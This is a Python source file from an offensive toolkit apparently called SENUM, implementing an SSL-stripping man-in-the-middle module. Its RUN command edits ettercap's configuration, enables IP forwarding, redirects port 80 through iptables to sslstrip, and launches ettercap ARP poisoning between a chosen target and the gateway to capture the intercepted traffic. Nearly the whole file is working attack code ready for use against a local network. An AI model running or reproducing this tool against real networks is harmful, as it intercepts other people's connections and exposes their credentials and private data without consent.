#!/usr/bin/env python

# SENUM version 1 Rev 0
# Written By: Viet Luu
# WEB: www.ring0lab.com



##########################################################################
# SENUM                                                                  #
#                                                                        #
# Copyright 2013 Viet Luu                                                #
#                                                                        #
# This file is part of www.ring0lab.com                                  #
#                                                                        #
# SENUM is free software; you can redistribute it and/or modify          #
# it under the terms of the GNU General Public License as published by   #
# the Free Software Foundation version 3 of the License.                 #
#                                                                        #
##########################################################################

from packages import helper
import commands
import time
import os
from packages import main


def ssl():
    signal = ''
    rip = ''
    gate = commands.getoutput("netstat -nr | awk 'FNR == 3 { print $2}'")
    interface = commands.getoutput("netstat -nr | awk 'FNR == 3 { print $8'}")
    lport = ''
    status = '0'
    while signal.upper() != 'EXIT':
        signal = str(raw_input('\033[1;32m[!]senum/SSL> \033[1;m'))
        if signal.upper().split().__contains__('SHOW') == 1 and signal.upper().split().__contains__('CONFIG') == 1 and len(signal.split()) == 2:
          print '\033[1;32m\n[!] - SENUM > Modules > Man > SSL Stripping:\033[1;m'
          print '''\033[1;32m
  ----------------------------------------------------------------
 |  DESCRIPTION             NAME                SETTING           |
  ----------------------------------------------------------------
  REMOTE IP ADDRESS         RHOST               %s
  NETWORK ADAPTER           INTERFACE           %s
  LOCAL PORT                LPORT               %s
  LOCAL GATEWAY ADDRESS     GATEWAY             %s
  \033[1;m''' % (rip, interface, lport, gate)
        elif signal.upper().split().__contains__('SET') == 1 and signal.upper().split().__contains__('RHOST') == 1 and len(signal.split()) == 2:
            pass
        elif signal.upper().split().__contains__('SET') == 1 and signal.upper().split().__contains__('RHOST') == 1 and len(signal.split()) == 3:
            rip = signal.split()[2]
            print '\n\033[1;32mRHOST -->\033[1;m'' \033[1;41m%s\033[1;m\n' % rip
        elif signal.upper().split().__contains__('SET') == 1 and signal.upper().split().__contains__('INTERFACE') == 1 and len(signal.split()) == 2:
            pass
        elif signal.upper().split().__contains__('SET') == 1 and signal.upper().split().__contains__('INTERFACE') == 1 and len(signal.split()) == 3:
            interface = signal.split()[2]
            print '\n\033[1;32mINTERFACE -->\033[1;m'' \033[1;41m%s\033[1;m\n' % interface
        elif signal.upper().split().__contains__('SET') == 1 and signal.upper().split().__contains__('LPORT') == 1 and len(signal.split()) == 2:
            pass
        elif signal.upper().split().__contains__('SET') == 1 and signal.upper().split().__contains__('LPORT') == 1 and len(signal.split()) == 3:
            lport = signal.split()[2]
            print '\n\033[1;32mLPORT -->\033[1;m'' \033[1;41m%s\033[1;m\n' % lport
        elif signal.upper().split().__contains__('SET') == 1 and signal.upper().split().__contains__('GATEWAY') == 1 and len(signal.split()) == 2:
            pass
        elif signal.upper().split().__contains__('SET') == 1 and signal.upper().split().__contains__('GATEWAY') == 1 and len(signal.split()) == 3:
            gate = signal.split()[2]
            print '\n\033[1;32mGATEWAY -->\033[1;m'' \033[1;41m%s\033[1;m\n' % gate
        elif signal.upper().split().__contains__('SAVE') == 1 and len(signal.split()) == 1:
            os.system('chmod u+x modules/man/save.sh')
            os.system('./modules/man/save.sh')
            time.sleep(1)
            print '\033[1;32m[!]Log Saved.\033[1;m'
        elif signal.upper().split().__contains__('RUN') == 1 and len(signal.split()) == 1:
            if rip == "":
                print "\033[1;41m[!]Can't start exploit. Check your remote host setting. \033[1;m"
            elif lport == "":
                print "\033[1;41m[!]Can't start exploit. Check your local port setting. \033[1;m"
            elif gate == "":
                print "\033[1;41m[!]Can't start exploit. Check your gateway setting. \033[1;m"
            elif interface == "":
                print "\033[1;41m[!]Can't start exploit. Check your interface setting. \033[1;m"
            elif status == '1':
                x = '\033[1;41m[!]Please stop the current exploit. \033[1;m'
                i = 0
                while i < 5:
                    print x
                    i += 1
            else:
                status = '1'
                os.system('mkdir -p /tmp/SENUM/SSL'), os.system('cp /etc/etter.conf /tmp/SENUM/SSL'), os.system("sed -i 's/65534/0/g' /etc/etter.conf")
                os.system("sed -i '168 s/#//g' /etc/etter.conf"), os.system("sed -i '169 s/#//g' /etc/etter.conf")
                outlocation = commands.getoutput("pwd")
                os.system('chmod 755 %s/modules/man/outssl.sh' % outlocation)
                print '\033[1;32m[!]Launching Exploit\033[1;m'
                if interface.__contains__('eth'):
                    os.system('ifconfig %s mtu 3000' % interface)
                else:
                    pass
                time.sleep(1)
                print '\033[1;32m[!]Targeting => %s\033[1;m' % rip
                time.sleep(1)
                print '\033[1;32m[!]Enable IP Forwarding\033[1;m'
                os.system('echo "1" > /proc/sys/net/ipv4/ip_forward')
                time.sleep(1)
                print '\033[1;32m[!]Port Redirection To => %s\033[1;m' % lport
                os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port %s' % lport)
                os.system('( sslstrip -l %s > /dev/null 2>&1 ) &' % lport)
                time.sleep(1)
                print '\033[1;32m[!]Enable MITM Attacks\033[1;m'
                os.system('( ettercap -Tq -i %s -M arp:remote /%s/ /%s/ > /tmp/SENUM/SSL/log.txt 2>&1 ) &' % (interface, rip, gate))
                time.sleep(3)
                fileHandle = open ( '/tmp/SENUM/SSL/log.txt', 'r')
                checksum = fileHandle.read()
                fileHandle.close()
                os.system('echo "1" > /proc/sys/net/ipv4/ip_forward')
                if interface.__contains__('wlan'):
                    if len(checksum) <= 300:
                        verify = 1
                        count = 3
                    else:
                        verify = checksum[743]
                        count = 0
                else:
                    if len(checksum) <= 300:
                        verify = 1
                        count = 3
                    else:
                        verify = checksum[709]
                        count = 0
                while int(verify) <= 1 and count <= 2:
                    print '\033[1;41m[!]Exploit Failed\033[1;m'
                    time.sleep(1)
                    print '\033[1;43m[!]Restarting Exploit\033[1;m'
                    main.cleansll()
                    status = '1'
                    os.system('mkdir -p /tmp/SENUM/SSL'), os.system('cp /etc/etter.conf /tmp/SENUM/SSL'), os.system("sed -i 's/65534/0/g' /etc/etter.conf")
                    os.system("sed -i '168 s/#//g' /etc/etter.conf"), os.system("sed -i '169 s/#//g' /etc/etter.conf")
                    outlocation = commands.getoutput("pwd")
                    os.system('chmod 755 %s/modules/man/outssl.sh' % outlocation)
                    if interface.__contains__('eth'):
                        os.system('ifconfig %s mtu 3000' % interface)
                    else:
                        pass
                    os.system('echo "1" > /proc/sys/net/ipv4/ip_forward')
                    os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port %s' % lport)
                    os.system('( sslstrip -l %s > /dev/null 2>&1 ) &' % lport)
                    os.system('( ettercap -Tq -i %s -M arp:remote /%s/ /%s/ > /tmp/SENUM/SSL/log.txt 2>&1 ) &' % (interface, rip, gate))
                    time.sleep(3)
                    fileHandle = open ( '/tmp/SENUM/SSL/log.txt', 'r')
                    checksum = fileHandle.read()
                    fileHandle.close()
                    count += 1
                if count != 3:
                    time.sleep(1)
                    os.system('gnome-terminal --geometry=700x8+5999+20 --hide-menubar --title=----------[SENUM-SSL-Sniffer]--------- -x sh -c "%s/modules/man/outssl.sh; sleep 99999999"' % outlocation)
                    print '\033[1;32m[!]Done.\033[1;m'
                else:
                    main.cleansll()
                    status = '0'
                    print '\033[1;41m[!]Exploit Failed!\033[1;m'
                    print '\033[1;41m[!]Target [%s] is un-reachable.\033[1;m' % rip
                    print '\033[1;41m[!]Please check your connection, and settings.\033[1;m'
        elif signal.upper().split().__contains__('SHOW') == 1 and signal.upper().split().__contains__('HELP') == 1 and len(signal.split()) == 2:
            helper.ssl()
        elif signal.upper().split().__contains__('STOP') == 1 and len(signal.split()) == 1:
            status = '0'
            print '\033[1;32m[!]Stopping Exploit\033[1;m'
            time.sleep(1)
            print '\033[1;32m[!]Done.\033[1;m'
            main.cleansll()
        elif signal.upper() == '' or signal.upper() == 'EXIT':
            pass
        else:
            print '\033[1;32mUnknown command "%s" | type "show help" for more help.\033[1;m' % signal.lower()



